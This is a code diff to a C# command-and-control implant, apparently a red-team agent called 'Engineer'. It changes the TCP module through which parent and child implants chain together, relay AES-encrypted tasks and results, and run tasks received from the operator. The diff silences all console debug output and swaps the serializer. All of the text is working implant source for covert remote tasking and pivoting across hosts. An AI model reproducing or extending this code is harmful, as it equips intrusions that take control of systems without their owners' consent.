@@ -83,12 +83,12 @@ namespace Engineer.Models
             {
                 if(IsParent)
                 {
-                    Console.WriteLine("starting parent client");
+                    //Console.WriteLine("starting parent client");
                   Task.Run(async()=> await Start_Parent_Client()); //only started via the Connect command 
                 }
                 else if(!IsParent)
                 {
-                    Console.WriteLine("starting child client");
+                    //Console.WriteLine("starting child client");
                     Task.Run(async () => await Start_Child_Client()); // only started when the engineer is created
                 }
             }
@@ -96,13 +96,13 @@ namespace Engineer.Models
             {
                 if(IsParent)
                 {
-                    Console.WriteLine("starting parent server");
+                    //Console.WriteLine("starting parent server");
                     Task.Run(async () => await Start_Parent_Server()); //only started via the Connect command 
                     
                 }
                 else if (!IsParent)
                 {
-                    Console.WriteLine("starting child server");
+                    //Console.WriteLine("starting child server");
                     Task.Run(async () => await Start_Child_Server()); // only started when the engineer is created
                 }
             }
@@ -115,7 +115,7 @@ namespace Engineer.Models
                     // this will start a TcpListener, check the localhost bool if true listen on localhost only, if false listen on 0.0.0.0, and listen on the ServerPort 
                     var ip = LocalHost ? IPAddress.Loopback : IPAddress.Any;
                     var listener = new TcpListener(ip, ServerPort);
-                    Console.WriteLine($"starting server at {ip}:{ServerPort}");
+                    //Console.WriteLine($"starting server at {ip}:{ServerPort}");
                     listener.Start(100);
                     Connect.Output = $"starting server at {ip}:{ServerPort}";
                 // async wait for a client to connect
@@ -128,8 +128,8 @@ namespace Engineer.Models
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+               // Console.WriteLine(e.Message);
+               // Console.WriteLine(e.StackTrace);
             }
         }
 
@@ -139,7 +139,7 @@ namespace Engineer.Models
             //once a client does connect for the first time this server will send the client the Program._metadata.Id and EngCommBase.Sleep values & get back the child's id , then add this EngTcpComm and the chidId to Program.TcpChildCommModules
             if (client.Connected)
             {
-                Console.WriteLine($"tcp client connected from {client.Client.RemoteEndPoint}");
+               // Console.WriteLine($"tcp client connected from {client.Client.RemoteEndPoint}");
             }
             byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
             byte[] Sleep = BitConverter.GetBytes(EngCommBase.Sleep);
@@ -165,7 +165,7 @@ namespace Engineer.Models
                 {
                     IsDataInTransit = true;
                     byte[] ChildData = await client.ReceiveData(_tokenSource.Token); // should always be a TaskResponse[] , but the data is seralized & encrypted 
-                    Console.WriteLine($"{DateTime.Now} reading task response from child");
+                   // Console.WriteLine($"{DateTime.Now} reading task response from child");
                     if (Program.TcpParentCommModules.Count() > 0) //if not this is the http Eng and this data can be queued to go to its parent 
                     {
                         ChildToParentData[Program.TcpParentCommModules.Keys.ElementAt(0)].Enqueue(ChildData); // this should be the current engineers only parent, if this value exists we are pushing data up the chain.
@@ -196,12 +196,12 @@ namespace Engineer.Models
             {
                 //make a new tcp client, connect to the ServerIP and BindPort , once connected, send the current Engineers Id and Sleep value to the server, then get back the server's Id, then add this EngTcpComm and the server's Id to Program.TcpParentCommModules
                 var client = new TcpClient();
-                Console.WriteLine("parent trying to connect to child");
+                //Console.WriteLine("parent trying to connect to child");
                 await client.ConnectAsync(Bindip, ServerPort);
                 if(client.Connected)
                 {
                     Connect.Output = "Connected to client at " + Bindip.ToString() + ":" + ServerPort.ToString();
-                    Console.WriteLine("parent connected to child");
+                    //Console.WriteLine("parent connected to child");
                 }
                 IsDataInTransit = true;
                 byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
@@ -216,12 +216,12 @@ namespace Engineer.Models
                     if (client.DataAvailable())
                     {
                         IsDataInTransit = true;
-                        Console.WriteLine("Tcp Data in Transit is True");
+                        //Console.WriteLine("Tcp Data in Transit is True");
                         if (!Program.IsEncrypted)
                         {
                             byte[] ChildId = await client.ReceiveData(_tokenSource.Token);
                             ChildIdString = Encoding.ASCII.GetString(ChildId);
-                            Console.WriteLine($"got back child id {ChildIdString}");
+                           // Console.WriteLine($"got back child id {ChildIdString}");
                             Program.TcpChildCommModules.TryAdd(ChildIdString, this);
                             ParentToChildData.TryAdd(ChildIdString, new ConcurrentQueue<byte[]>());
                             IsDataInTransit = false;
@@ -230,12 +230,12 @@ namespace Engineer.Models
                     }
                 }
                 //once the child id is received, start a while loop to send and recive data from the child
-                Console.WriteLine($"{DateTime.UtcNow} starting parent to child loop");
+                //Console.WriteLine($"{DateTime.UtcNow} starting parent to child loop");
                 while (true)
                 {
                     if (client.DataAvailable())
                     {
-                        Console.WriteLine($"{DateTime.UtcNow} data available from child");
+                        //Console.WriteLine($"{DateTime.UtcNow} data available from child");
                         IsDataInTransit = true;
                         while (Program.IsEncrypted)
                         {
@@ -245,7 +245,7 @@ namespace Engineer.Models
                         {
                             // should always be a TaskResponse[] , but the data is seralized & encrypted 
                             byte[] ChildData = await client.ReceiveData(_tokenSource.Token); 
-                            Console.WriteLine($"{DateTime.UtcNow} reading task response from child");
+                            //Console.WriteLine($"{DateTime.UtcNow} reading task response from child");
                             //if this is not the http eng we are pushing data up the chain
                             if (Program.TcpParentCommModules.Count() > 0) 
                             {
@@ -286,8 +286,8 @@ namespace Engineer.Models
             catch (Exception ex)
             {
                 Connect.Output = ex.Message;
-                Console.WriteLine(ex.Message);
-                Console.WriteLine(ex.StackTrace);
+               // Console.WriteLine(ex.Message);
+               // Console.WriteLine(ex.StackTrace);
             }
             
         }
@@ -299,19 +299,19 @@ namespace Engineer.Models
                 // this will start a TcpListener, check the localhost bool if true listen on localhost only, if false listen on 0.0.0.0 and listen on the ServerPort
                 var ip = LocalHost ? IPAddress.Loopback : IPAddress.Any;
                 var listener = new TcpListener(ip, ServerPort);
-                Console.WriteLine($"starting server at {ip}:{ServerPort}");
+                //Console.WriteLine($"starting server at {ip}:{ServerPort}");
                 listener.Start(100);
                 //wait async for the client, when it connects it will send the parent's id and the sleep value, then this child will send back the child's id, then add this EngTcpComm and the parentId to Program.TcpParentCommModules
                 var client = await listener.AcceptTcpClientAsync();
                 if(client.Connected)
                 {
-                    Console.WriteLine($"tcp client connected from {client.Client.RemoteEndPoint}");
+                   // Console.WriteLine($"tcp client connected from {client.Client.RemoteEndPoint}");
                 }
                 while (true)
                 {
                     if (client.DataAvailable())
                     {
-                        Console.WriteLine($"{DateTime.UtcNow} tcp data available from parent");
+                       // Console.WriteLine($"{DateTime.UtcNow} tcp data available from parent");
                         IsDataInTransit = true;
                         while (Program.IsEncrypted)
                         {
@@ -324,14 +324,14 @@ namespace Engineer.Models
                             byte[] Sleep = ParentIdSleep.Skip(36).Take(4).ToArray();
                             string ParentIdString = Encoding.ASCII.GetString(ParentId);
                             //Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
-                            Console.WriteLine($"got back parent id {ParentIdString}");
+                            //Console.WriteLine($"got back parent id {ParentIdString}");
                             //update EngBaseComm Sleep value
                             EngCommBase.Sleep = BitConverter.ToInt32(Sleep, 0);
-                            Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
+                           // Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
                             Program.TcpParentCommModules.TryAdd(ParentIdString, this);
                             ChildToParentData.TryAdd(ParentIdString, new ConcurrentQueue<byte[]>());
                             byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
-                            Console.WriteLine($"Id {Program._metadata.Id}");
+                            //Console.WriteLine($"Id {Program._metadata.Id}");
                             await client.SendData(Id, _tokenSource.Token);
                             var firstCheckTask = new EngineerTask
                             {
@@ -351,7 +351,7 @@ namespace Engineer.Models
                     }
                 }
                 //once the parent id is received, start a while loop to send and recive data from the parent
-                Console.WriteLine($"{DateTime.UtcNow} starting child to parent loop");
+                //Console.WriteLine($"{DateTime.UtcNow} starting child to parent loop");
                 while (true)
                 {
                     if (client.Connected)
@@ -368,10 +368,10 @@ namespace Engineer.Models
                         if (!Program.IsEncrypted)
                         {
                             byte[] ParentData = await client.ReceiveData(_tokenSource.Token); // should always be a C2TaskMessage[] , but the data is seralized & encrypted  NEED TO CHANGE so we can process this C2TaskMessage
-                            Console.WriteLine($"{DateTime.Now} reading C2 Task from Parent");
+                            //Console.WriteLine($"{DateTime.Now} reading C2 Task from Parent");
 
                             byte[] seralizedParentData = Encryption.AES_Decrypt(ParentData, Program.MessagePathKey);
-                            C2TaskMessage incomingMessage = seralizedParentData.ProDeserialize<C2TaskMessage>();
+                            C2TaskMessage incomingMessage = seralizedParentData.JsonDeserialize<C2TaskMessage>();
                             //check the C2TaskMessage PathMessage Count if its highrt then 0, read the first item and if that matches the current engineers id add the message to the queue
                             if (incomingMessage.PathMessage.ElementAt(0) == Program._metadata.Id)
                             {
@@ -379,14 +379,14 @@ namespace Engineer.Models
                                 if (incomingMessage.PathMessage.Count > 0)
                                 {
                                     var childid = incomingMessage.PathMessage[0];
-                                    var seeralizedMessage = incomingMessage.ProSerialise();
+                                    var seeralizedMessage = incomingMessage.JsonSerialize();
                                     var EncryptedMessage = Encryption.AES_Encrypt(seeralizedMessage, Program.MessagePathKey);
                                     ParentToChildData[childid].Enqueue(EncryptedMessage);
                                 }
                                 //else this task is for this current engineer and should be added to the taskQueue
                                 else
                                 {
-                                    byte[] decryptedTaskData = Encryption.AES_Decrypt(incomingMessage.TaskData,Program.UniqueTaskKey);
+                                    byte[] decryptedTaskData = Encryption.AES_Decrypt(incomingMessage.TaskData.ToArray(), Program.UniqueTaskKey);
                                     HandleResponse(decryptedTaskData);
                                 }
                             }
@@ -407,7 +407,7 @@ namespace Engineer.Models
                                 {
                                     Thread.Sleep(10);
                                 }
-                                Console.WriteLine($"{DateTime.UtcNow} calling send data to parent");
+                               // Console.WriteLine($"{DateTime.UtcNow} calling send data to parent");
                                 await client.SendData(ForwardedChildData, _tokenSource.Token);
                             }
                         }
@@ -419,8 +419,8 @@ namespace Engineer.Models
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
-                Console.WriteLine(ex.StackTrace);
+              //  Console.WriteLine(ex.Message);
+               // Console.WriteLine(ex.StackTrace);
             } 
         }
 
@@ -430,12 +430,12 @@ namespace Engineer.Models
             {
                 // make a new tcp client , connect to the ServerIP and bindPort, once connected, recieve the parentId and sleep time, then send back the current engineer id
                 var client = new TcpClient();
-                Console.WriteLine("child trying to connect to parent");
+                //Console.WriteLine("child trying to connect to parent");
                 await client.ConnectAsync(Bindip, ServerPort);
                 if (client.Connected)
                 {
                     Connect.Output = "Connected to client at " + Bindip.ToString() + ":" + ServerPort.ToString();
-                    Console.WriteLine("child connected to parent");
+                    //Console.WriteLine("child connected to parent");
                 }
                 while (true)
                 {
@@ -448,10 +448,10 @@ namespace Engineer.Models
                             byte[] ParentId = ParentIdSleep.Take(36).ToArray();
                             byte[] Sleep = ParentIdSleep.Skip(36).Take(4).ToArray();
                             string ParentIdString = Encoding.ASCII.GetString(ParentId);
-                            Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
-                            Console.WriteLine($"got back parent id {ParentIdString}");
+                           //Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
+                           // Console.WriteLine($"got back parent id {ParentIdString}");
                             EngCommBase.Sleep = BitConverter.ToInt32(Sleep, 0);
-                            Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
+                           // Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
                             Program.TcpParentCommModules.TryAdd(ParentIdString, this);
                             ChildToParentData.TryAdd(ParentIdString, new ConcurrentQueue<byte[]>());
                             var firstCheckTask = new EngineerTask
@@ -489,10 +489,10 @@ namespace Engineer.Models
                         if (!Program.IsEncrypted)
                         {
                             byte[] ParentData = await client.ReceiveData(_tokenSource.Token); // should always be a C2TaskMessage[] , but the data is seralized & encrypted NEED TO CHANGE so we can process this C2TaskMessage
-                            Console.WriteLine($"{DateTime.Now} reading C2 Task from Parent");                                                                  
+                            //Console.WriteLine($"{DateTime.Now} reading C2 Task from Parent");                                                                  
                                                                                                                                                            
                             byte[] seralizedParentData = Encryption.AES_Decrypt(ParentData, Program.MessagePathKey);
-                            C2TaskMessage incomingMessage = seralizedParentData.ProDeserialize<C2TaskMessage>();
+                            C2TaskMessage incomingMessage = seralizedParentData.JsonDeserialize<C2TaskMessage>();
                             //check the C2TaskMessage PathMessage Count if its highrt then 0, read the first item and if that matches the current engineers id add the message to the queue
                             if (incomingMessage.PathMessage.ElementAt(0) == Program._metadata.Id)
                             {
@@ -500,14 +500,14 @@ namespace Engineer.Models
                                 if (incomingMessage.PathMessage.Count > 0)
                                 {
                                     var childid = incomingMessage.PathMessage[0];
-                                    var seeralizedMessage = incomingMessage.ProSerialise();
+                                    var seeralizedMessage = incomingMessage.JsonSerialize();
                                     var EncryptedMessage = Encryption.AES_Encrypt(seeralizedMessage,Program.MessagePathKey);
                                     ParentToChildData[childid].Enqueue(EncryptedMessage);
                                 }
                                 //else this task is for this current engineer and should be added to the taskQueue
                                 else
                                 {
-                                    byte[] decryptedTaskData = Encryption.AES_Decrypt(incomingMessage.TaskData,Program.UniqueTaskKey);
+                                    byte[] decryptedTaskData = Encryption.AES_Decrypt(incomingMessage.TaskData.ToArray(), Program.UniqueTaskKey);
                                     HandleResponse(decryptedTaskData);
                                 }
                             }
@@ -537,8 +537,8 @@ namespace Engineer.Models
             }
             catch(Exception ex)
             {
-                Console.WriteLine(ex.Message);
-                Console.WriteLine(ex.StackTrace);
+               // Console.WriteLine(ex.Message);
+               // Console.WriteLine(ex.StackTrace);
             }
         }
 
@@ -559,7 +559,7 @@ namespace Engineer.Models
         {
             try
             {
-                var tasks = response.ProDeserialize<List<EngineerTask>>();
+                var tasks = response.JsonDeserialize<List<EngineerTask>>();
 
                 if (tasks != null && tasks.Any())
                 {
